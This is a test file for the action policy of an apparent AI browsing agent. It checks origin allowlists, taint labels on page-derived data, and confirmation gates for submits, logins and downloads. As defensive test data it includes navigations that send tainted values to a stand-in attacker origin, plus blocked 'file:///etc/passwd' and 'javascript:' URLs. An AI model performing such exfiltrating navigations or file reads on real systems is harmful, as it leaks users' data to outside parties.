import { describe, expect, it } from 'vitest';
import { combine, evaluatePolicy, originsInTask, type PolicyContext } from '../../src/core/policy';
import { TaintRegistry } from '../../src/core/taint';
import type { PlannerAction, SnapshotElement } from '../../src/core/types';

const SITE = 'http://127.0.0.1:4001';
const ATTACKER = 'http://localhost:4002';

function ctx(task: string, extra: Partial<PolicyContext> = {}): PolicyContext {
  const taint = new TaintRegistry(task);
  return { currentUrl: `${SITE}/shop.html`, allowedOrigins: new Set([SITE, ...originsInTask(task)]), taint, contextOrigins: [SITE], ...extra };
}
const act = (name: PlannerAction['name'], args: Record<string, unknown>): PlannerAction => ({ name, args });
const input = (o: Partial<SnapshotElement> = {}): SnapshotElement => ({ ref: 'e1', role: 'textbox', name: 'Notes', tag: 'input', inputType: 'text', formAction: `${SITE}/submit`, inForm: true, ...o });

describe('originsInTask', () => {
  it('only allowlists hosts written with an explicit scheme (not filenames, bare names or email domains)', () => {
    const o = originsInTask('Find the price on http://127.0.0.1:4001/shop.html and compare with shop.example.com. Attach report.zip, setup.py and notes.md. Mail me at bob@mail.example.org');
    expect(o).toEqual(['http://127.0.0.1:4001']);
  });
});

describe('policy: navigation', () => {
  it('allows navigation within task origins', () => {
    expect(evaluatePolicy(act('navigate', { url: `${SITE}/article.html` }), ctx(`look at ${SITE}`)).decision).toBe('allow');
  });
  it('requires confirmation for a new origin not in the task', () => {
    const r = evaluatePolicy(act('navigate', { url: `${ATTACKER}/collect?d=x` }), ctx(`look at ${SITE}`));
    expect(r.decision).toBe('confirm');
    expect(r.newOrigin).toBe(ATTACKER);
  });
  it('requires confirmation for untrusted URL to a different (even allowlisted) origin', () => {
    const c = ctx(`compare ${SITE} with ${ATTACKER}`);
    c.taint.register('secret-coupon-99', 'untrusted', [{ source: 'reader', timestamp: 't' }]);
    const r = evaluatePolicy(act('navigate', { url: `${ATTACKER}/x?c=secret-coupon-99` }), c);
    expect(r.decision).toBe('confirm');
    expect(r.values[0].label).toBe('untrusted');
    expect(r.values[0].provenance[0].source).toBe('reader');
  });
  it('allows untrusted URL on the same origin (egress content filter still applies)', () => {
    expect(evaluatePolicy(act('navigate', { url: `${SITE}/search?q=abc` }), ctx(`find on ${SITE}`)).decision).toBe('allow');
  });
  it('blocks javascript:, file: and data: URLs', () => {
    for (const url of ['javascript:alert(1)', 'file:///etc/passwd', 'data:text/html,hi']) {
      expect(evaluatePolicy(act('navigate', { url }), ctx('x')).decision).toBe('block');
    }
  });
});

describe('policy: forms and clicks', () => {
  it('always confirms submit, listing field values with taint', () => {
    const c = ctx(`name Bob Jones on ${SITE}`, { element: input(), formFields: [{ name: 'name', value: 'Bob Jones' }, { name: 'x', value: 'from-page-data' }] });
    const r = evaluatePolicy(act('submit', { ref: 'e1' }), c);
    expect(r.decision).toBe('confirm');
    expect(r.destination).toBe(`${SITE}/submit`);
    expect(r.values.map((v) => v.label)).toEqual(['trusted', 'untrusted']);
  });
  it('confirms clicking a submit button', () => {
    const r = evaluatePolicy(act('click', { ref: 'e1' }), ctx('x', { element: input({ role: 'button', name: 'Go', isSubmit: true }) }));
    expect(r.decision).toBe('confirm');
  });
  it('confirms risky button names regardless of taint', () => {
    for (const name of ['Buy now', 'Delete account', 'Send', 'Log in', 'Place order']) {
      expect(evaluatePolicy(act('click', { ref: 'e1' }), ctx('x', { element: input({ role: 'button', name, inForm: false }) })).decision).toBe('confirm');
    }
    expect(evaluatePolicy(act('click', { ref: 'e1' }), ctx('x', { element: input({ role: 'button', name: 'Add to cart', inForm: false }) })).decision).toBe('allow');
  });
  it('confirms typing untrusted text, allows typing user-provided text', () => {
    const c = ctx('use name Bob Jones', { element: input() });
    expect(evaluatePolicy(act('type', { ref: 'e1', text: 'Bob Jones' }), c).decision).toBe('allow');
    expect(evaluatePolicy(act('type', { ref: 'e1', text: 'alice@example.com 12 Main St' }), c).decision).toBe('confirm');
  });
  it('always confirms password fields and login forms', () => {
    expect(evaluatePolicy(act('type', { ref: 'e1', text: 'hunter2' }), ctx('password hunter2', { element: input({ inputType: 'password' }) })).decision).toBe('confirm');
    expect(evaluatePolicy(act('type', { ref: 'e1', text: 'bob' }), ctx('user bob', { element: input({ formHasPassword: true }) })).decision).toBe('confirm');
  });
  it('confirms links to new origins and downloads', () => {
    expect(evaluatePolicy(act('click', { ref: 'e1' }), ctx('x', { element: input({ role: 'link', name: 'more', href: `${ATTACKER}/a`, inForm: false }) })).decision).toBe('confirm');
    expect(evaluatePolicy(act('click', { ref: 'e1' }), ctx('x', { element: input({ role: 'link', name: 'setup', href: `${SITE}/setup.exe`, inForm: false }) })).decision).toBe('confirm');
  });
  it('blocks unknown refs', () => {
    expect(evaluatePolicy(act('click', { ref: 'e99' }), ctx('x')).decision).toBe('block');
  });
});

describe('policy + judge combination', () => {
  const allow = { decision: 'allow' as const, reasons: [], values: [] };
  const confirm = { decision: 'confirm' as const, reasons: ['code rule'], values: [] };
  it('judge can escalate', () => {
    expect(combine(allow, { verdict: 'confirm', reason: 'r' }).decision).toBe('confirm');
    expect(combine(confirm, { verdict: 'block', reason: 'r' }).decision).toBe('block');
  });
  it('judge can never downgrade a code-required confirmation', () => {
    expect(combine(confirm, { verdict: 'allow', reason: 'looks fine' }).decision).toBe('confirm');
  });
});
